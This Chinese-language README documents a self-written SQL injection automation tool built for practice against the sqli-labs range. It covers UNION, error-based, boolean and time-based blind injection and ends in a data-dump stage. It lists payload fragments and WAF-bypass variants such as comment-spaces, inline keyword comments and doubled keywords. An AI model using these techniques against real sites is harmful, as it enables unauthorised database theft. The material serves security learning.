# Automated MySQL Injection

一个为了学习而写的小型 SQL 注入自动化工具，靶场是 **sqli-labs**。
从注入点探测到数据导出全程自动，支持 UNION、报错、布尔盲注、时间盲注，
并且能对过滤规则自动探测可用的语法写法。

> **免责声明**
> 本项目仅用于**本地靶场和已获授权的安全测试**。
> 对未授权的系统使用属于违法行为，作者不承担任何责任。

---

## 1. 功能

| 能力 | 说明 |
|---|---|
| 注入探测 | 报错回显 + 布尔页面差异双判断 |
| UNION 注入 | `ORDER BY` 求字段数，标记法找回显位 |
| 报错注入 | `extractvalue` / `updatexml`，按 28 字符分片（MySQL 只显示 32 字符） |
| 布尔盲注 | 二分法，约 7 次请求猜一个字符 |
| 时间盲注 | `if(cond, sleep(n), 0)`，相对基准耗时判断 |
| 注入位 | GET 参数 / POST 表单 / Cookie / 请求头 |
| 限制绕过 | 空格、`and`、关键字、逗号、比较符写法自动探测 |
| 请求记录 | 每个请求写入 `history/run_*.jsonl` |

---

## 2. 环境与快速开始

* Python 3.8+
* [requests](https://pypi.org/project/requests/)

```bash
pip install requests

# 用 config.py 里的默认值跑全流程
python main.py

# 换目标
python main.py --url "http://192.168.1.6/sql/Less-1/" --db security --table users --limit 5
```

已在 sqli-labs（MySQL 5.5.53，`http://192.168.1.6/sql/...`）上实测通过。

---

## 3. 目录结构

```
main.py                 7 阶段流程 + 命令行入口
config.py               默认值：目标、闭合方式、注释符、行为参数
core/
  point.py              注入位：GET / POST / Cookie / Header
  injector.py           prefix + 语句 + suffix -> 一次请求
  pipeline.py           绕过变换管线
payloads/
  detectors.py          注入探测
  union.py              字段数、回显位、UNION 提取
  error_based.py        extractvalue / updatexml 提取
  blind.py              基于提问器的二分提取
  extractor.py          information_schema 的 SQL 构造（纯函数）
conditions/
  boolean.py            真假页面比较
  oracle.py             布尔/时间提问器 + 语法自动探测
response/analyzer.py    报错识别、相似度、哨兵提取
bypass/
  syntax.py             语法变体（Dialect）
  whitespace.py         空格转注释 / 空格转 tab
  encoding.py           URL 编码 / 二次编码
transport/http_client.py  HTTP 底层
history/recorder.py     逐请求 JSONL 记录
tests/                  离线单元测试（不需要网络）
```

---

## 4. 注入参数的两种配置方式

所有注入参数都可以用**两种方式**给值，值本身含义完全一样，
区别只有「生效范围」和「优先级」。

### 4.1 命令行模式（临时，单次生效）

每次运行时把参数写在命令后面，不改任何文件。适合频繁换靶场。

```bash
python main.py --url "http://192.168.1.6/sql/Less-5/" --param id --inject get \
               --mode blind --blind bool --db security --limit 5
```

### 4.2 修改 config.py 模式（持久，作为默认值）

改一次常量，之后所有运行都不用再带参数。适合在一关停留较久。

```python
# config.py
TARGET_URL = "http://192.168.1.6/sql/Less-2/"
PARAM_NAME = "id"
PREFIX = "1"          # 数字型闭合
UNION_PREFIX = "-1"
SUFFIX = "-- -"
INJECT_MODE = "get"
BLIND_TYPE = "auto"
BYPASS_MODE = "auto"
```

改完后直接裸跑：

```bash
python main.py
```

### 4.3 参数对照表

**优先级：命令行 > `config.py`。** 只要命令行给了值，就一定覆盖同名常量。

| 用途 | 命令行参数 | config.py 常量 | 默认值 | 命令行能否覆盖 |
|---|---|---|---|---|
| 目标地址 | `--url` | `TARGET_URL` | `http://192.168.1.6/sql/Less-5/` | 能 |
| 参数名 / 字段名 / Cookie 名 / 头名 | `--param` | `PARAM_NAME` | `id` | 能 |
| 目标数据库 | `--db` | — | 当前数据库 | 能（无默认常量） |
| 要导出的表 | `--table` | — | 无（不传就跳过阶段 7） | 能（无默认常量） |
| 导出行数 | `--limit` | `DUMP_LIMIT` | `10` | 能 |
| 单请求超时（秒） | `--timeout` | `TIMEOUT` | `10` | 能 |
| 字段数探测上限 | `--max-columns` | `MAX_COLUMNS` | `20` | 能 |
| 注入位 | `--inject` | `INJECT_MODE` | `get` | 能 |
| 强制注入模式 | `--mode` | — | `auto` | 能（无默认常量） |
| 盲注手段 | `--blind` | `BLIND_TYPE` | `auto` | 能 |
| 语法变体 | `--bypass` | `BYPASS_MODE` | `auto` | 能 |
| 时间盲注等待秒数 | `--sleep` | `BLIND_SLEEP` | `2.0` | 能 |
| SQL 闭合前缀 | — | `PREFIX` | `1'` | **不能（只能改 config）** |
| UNION 闭合前缀 | — | `UNION_PREFIX` | `-1'` | **不能（只能改 config）** |
| 注释符 / 收尾 | — | `SUFFIX` | `-- -` | **不能（只能改 config）** |
| 绕过变换列表 | — | `TRANSFORMS` | `[]` | **不能（只能改 config）** |
| 盲注单次最大长度 | — | `BLIND_MAX_LEN` | `1024` | **不能（只能改 config）** |

### 4.4 命令行改不了的那几个

`PREFIX`、`UNION_PREFIX`、`SUFFIX`、`TRANSFORMS`、`BLIND_MAX_LEN` 只存在于 `config.py`。
它们描述的是「SQL 怎么闭合」，不是「请求发到哪里」，所以保留为源码常量。
换单引号 / 数字 / 括号 / 双引号类型时，仍然要改 `config.py`：

```python
# 常见闭合方式
PREFIX = "1'"     ; UNION_PREFIX = "-1'"      # Less-1 单引号
PREFIX = "1"      ; UNION_PREFIX = "-1"       # Less-2 数字型
PREFIX = "1')"    ; UNION_PREFIX = "-1')"     # Less-3 单引号加括号
PREFIX = '1")'    ; UNION_PREFIX = '-1")'     # Less-4 双引号加括号
PREFIX = '1"'     ; UNION_PREFIX = '-1"'      # Less-10 双引号
```

### 4.5 为什么 `SUFFIX` 是 `-- -` 而不是 `--+`

浏览器手测常用 `--+`，因为浏览器会把 URL 里的 `+` 当成空格。
但 `requests` 会把 `+` 编码成 `%2B`（真正的加号），服务器收到的是 `--+`，
MySQL 的 `--` 注释后面必须有空白才生效，于是注释失效、语句报错。
用 `-- -` 才行：中间的空格在传输时被编码成 `+`，PHP 解码后又变回空格，注释成立。

---

## 5. 注入模式（`--mode`）

`auto` 的选择顺序：

```
UNION（找到回显位） -> 报错（能带出数据） -> 盲注（布尔优先，失败再时间）
```

| 模式 | 适用场景 | 速度 |
|---|---|---|
| `union` | 页面会显示查询结果 | 每个值 1 次请求 |
| `error` | 不显示结果，但会回显 SQL 报错 | 每 28 字符约 1 次请求 |
| `blind` | 结果和报错都不显示 | 布尔约每字符 7-8 次请求；时间受 sleep 拖慢 |

`--blind` 只在盲注模式下生效：

| 取值 | 含义 |
|---|---|
| `auto` | 先布尔，页面完全不变再退到时间盲注 |
| `bool` | 只用布尔盲注 |
| `time` | 只用时间盲注，网络慢时调大 `--sleep` |

---

## 6. 注入位（`--inject`）

| 取值 | payload 位置 | sqli-labs 对应 |
|---|---|---|
| `get` | `?id=payload` | Less-1 ~ 10 |
| `post` | 表单字段 `uname=payload` | Less-11 ~ 17 |
| `header` | 请求头（`User-Agent`、`Referer` 等） | Less-18 ~ 19 |
| `cookie` | `Cookie: uname=payload` | Less-20 ~ 22 |

用 `--param` 指定被注入的字段名、Cookie 名或**请求头名**：

```bash
python main.py --url "http://192.168.1.6/sql/Less-11/" --inject post   --param uname
python main.py --url "http://192.168.1.6/sql/Less-20/" --inject cookie --param uname
python main.py --url "http://192.168.1.6/sql/Less-18/" --inject header --param User-Agent
```

---

## 7. 限制绕过（`--bypass`）

`auto` 会按候选顺序尝试各种写法，并用**答案已知**的条件在真实注入点上验证：

```
length(database()) > 0                    必须为真
length(database()) > 9999                 必须为假
ascii(substr((SELECT 0x41),1,1)) = 65     必须为真
ascii(substr((SELECT 0x41),1,1)) = 66     必须为假
```

四项全对，说明这套写法没被过滤；有任何一项错，就换下一个候选。
不需要人工猜这一关过滤了什么。

| 变体 | 替换方式 |
|---|---|
| `plain` | `and 1=1` |
| `space_comment` | `and/**/1=1` |
| `space_tab` | 用制表符当分隔符 |
| `and_amp` | `&& 1=1` |
| `keyword_inline` | `/*!50000select*/` |
| `keyword_case` | `SeLeCt` |
| `keyword_double` | `selselectect` |
| `no_comma` | `substr(x from 1 for 1)` |
| `between` | 用 `x between n and m` 代替 `>` |

想对比或跳过探测时可以强制指定：

```bash
python main.py --bypass space     # 用 /**/ 代替空格
python main.py --bypass and       # 用 && 代替 and
python main.py --bypass comma     # 用 substr ... from ... for
```

---

## 8. 七阶段流程

| 阶段 | 内容 |
|---|---|
| 1 | 注入点探测（报错回显、布尔差异） |
| 2 | `ORDER BY` 求字段数（无报错且布尔无信号时跳过） |
| 3 | 找回显位；选择 UNION / 报错 / 盲注；探测语法变体 |
| 4 | 读版本、当前库、当前用户 |
| 5 | 枚举数据库 |
| 6 | 枚举表与字段 |
| 7 | 导出数据（只有传了 `--table` 才执行） |

---

## 9. 常用示例

```bash
# Less-1：UNION 路线
python main.py --url "http://192.168.1.6/sql/Less-1/" --db security --table users --limit 5

# Less-5：无回显 -> 布尔盲注
python main.py --url "http://192.168.1.6/sql/Less-5/" --mode blind --blind bool

# Less-9：页面不变 -> 时间盲注
python main.py --url "http://192.168.1.6/sql/Less-9/" --mode blind --blind time --sleep 3

# Less-11：POST 表单
python main.py --url "http://192.168.1.6/sql/Less-11/" --inject post --param uname --mode blind

# 对比不同绕过策略
python main.py --url "http://192.168.1.6/sql/Less-5/" --mode blind --bypass plain
python main.py --url "http://192.168.1.6/sql/Less-5/" --mode blind --bypass and
```

---

## 10. 测试

```bash
python tests/test_syntax.py        # 语法变体 + 注入位
python tests/test_sql_builders.py  # UNION / 报错 SQL 构造
python tests/test_analyzer.py      # 响应分析
python tests/test_transforms.py    # 绕过变换管线
```

全部为离线测试，不访问网络。

---

## 11. 常见问题

**盲注太慢怎么办？**
布尔盲注每个字符约 7 次请求。靶机单次响应 2 秒时，读一个 30 字符的值要好几分钟；
时间盲注每次为真还要再等一个 `sleep`。网络稳定时把 `--sleep` 调小，并发尚未实现。

**`--mode union` 直接退出了。**
没找到回显位，说明查询结果没有输出到页面。改用 `auto` 或 `blind`。

**`ORDER BY` 求不出字段数。**
既没有报错回显，布尔差异也不明显。盲注不需要字段数，流程会跳过后继续。

**报错注入的数据被截断了？**
MySQL 的 `extractvalue` / `updatexml` 报错只显示前 32 个字符。
工具按 28 字符分片并在本地拼接，所以取回的值是完整的。

**完全探测不到注入。**
检查 `config.py` 里的 `PREFIX` / `SUFFIX`，以及 `--inject`、`--param` 是否指向真正被拼接进 SQL 的位置。
